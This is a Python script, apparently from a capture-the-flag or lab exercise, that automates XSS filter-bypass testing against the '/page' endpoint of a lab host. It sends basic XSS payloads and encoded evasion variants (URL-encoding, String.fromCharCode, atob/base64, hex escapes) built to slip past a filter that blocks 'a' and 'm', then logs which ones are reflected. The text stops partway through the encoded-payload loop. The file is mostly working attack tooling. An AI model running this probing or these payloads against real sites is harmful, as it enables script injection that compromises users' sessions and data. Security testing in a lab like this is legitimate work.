import requests
import re
import json
import urllib.parse
import base64

# Base URL for the target
BASE_URL = "http://target-8:5010"

def test_payload(payload, description):
    """Test a single payload and return the response details"""
    try:
        # The endpoint expects the payload in the 'name' parameter
        response = requests.get(
            f"{BASE_URL}/page",
            params={'name': payload},
            timeout=5
        )
        
        # Check if payload was reflected
        if payload in response.text:
            reflection = "FULL_REFLECTION"
        elif any(char in response.text for char in payload if char.isalnum()):
            reflection = "PARTIAL_REFLECTION"
        else:
            reflection = "NO_REFLECTION"
        
        # Check for error messages or filter indicators
        error_indicators = []
        if "blocked" in response.text.lower():
            error_indicators.append("BLOCKED_KEYWORD")
        if "invalid" in response.text.lower():
            error_indicators.append("INVALID_INPUT")
        if "filter" in response.text.lower():
            error_indicators.append("FILTER_TRIGGERED")
            
        # Check for character stripping
        stripped_chars = []
        for char in ['a', 'm', 'A', 'M']:
            if char in payload and char not in response.text:
                stripped_chars.append(char)
        
        return {
            'description': description,
            'payload': payload,
            'status_code': response.status_code,
            'reflection': reflection,
            'stripped_chars': stripped_chars,
            'error_indicators': error_indicators,
            'response_snippet': response.text[:500] if len(response.text) > 500 else response.text
        }
    except Exception as e:
        return {
            'description': description,
            'payload': payload,
            'error': str(e)
        }

def contains_blocked_chars(payload):
    """Check if payload contains 'a' or 'm' (case-sensitive)"""
    return 'a' in payload or 'm' in payload

def analyze_filter_behavior():
    """Main analysis function"""
    print("=" * 80)
    print("XSS FILTER ANALYSIS FOR /page ENDPOINT")
    print("Testing filter behavior with 'a' and 'm' character blocks")
    print("=" * 80)
    
    results = {
        'payloads_with_blocked_chars': [],
        'payloads_without_blocked_chars': [],
        'encoding_attempts': [],
        'string_fromcharcode_attempts': [],
        'eval_alternatives': [],
        'successful_reflections': [],
        'partial_reflections': [],
        'filter_errors': []
    }
    
    # Test Category 1: Basic payloads (likely blocked due to 'a' or 'm')
    basic_payloads = [
        ('";alert(1)//', 'Basic alert injection'),
        ('";confirm(1)//', 'Basic confirm injection'),
        ('";prompt(1)//', 'Basic prompt injection'),
        ('";eval("alert(1)")//', 'Basic eval injection'),
        ('<script>alert(1)</script>', 'Direct script tag'),
        ('<img src=x onerror=alert(1)>', 'Image onerror'),
        ('<svg onload=alert(1)>', 'SVG onload'),
    ]
    
    print("\n[TESTING] Basic XSS Payloads (likely contain 'a' or 'm')")
    print("-" * 80)
    for payload, desc in basic_payloads:
        result = test_payload(payload, desc)
        if contains_blocked_chars(payload):
            results['payloads_with_blocked_chars'].append(result)
        else:
            results['payloads_without_blocked_chars'].append(result)
            
        if result.get('reflection') == 'FULL_REFLECTION':
            results['successful_reflections'].append(result)
        elif result.get('reflection') == 'PARTIAL_REFLECTION':
            results['partial_reflections'].append(result)
            
        if result.get('error_indicators'):
            results['filter_errors'].append(result)
            
        print(f"[TEST] {desc}")
        print(f"  Payload: {payload}")
        print(f"  Contains 'a' or 'm': {contains_blocked_chars(payload)}")
        print(f"  Status: {result.get('status_code')}")
        print(f"  Reflection: {result.get('reflection')}")
        if result.get('stripped_chars'):
            print(f"  Stripped chars: {result['stripped_chars']}")
        if result.get('error_indicators'):
            print(f"  Errors: {result['error_indicators']}")
        print()
    
    # Test Category 2: Encoded payloads
    encoded_payloads = [
        ('";%61lert(1)//', 'URL-encoded a (lowercase)'),
        ('";%41lert(1)//', 'URL-encoded A (uppercase)'),
        ('";eval(String.fromCharCode(97,108,101,114,116,40,49,41))//', 'String.fromCharCode (contains a,m)'),
        ('";eval(atob("YWxlcnQoMSk="))//', 'Base64 encoded alert (contains a)'),
        ('<scr\x69pt>alert(1)</scr\x69pt>', 'Hex escape in script tag'),
        ('<img src=x onerror=\x61lert(1)>', 'Hex escape in onerror'),
    ]
    
    print("[TESTING] Encoded Payloads")
    print("-" * 80)
    for payload, desc in encoded_payloads:
        result = test_payload(payload, desc)
        results['encoding_attempts'].append(result)
        
        if result.get('reflection') == 'FULL_REFLECTION':
            results['successful_reflections'].append(result)
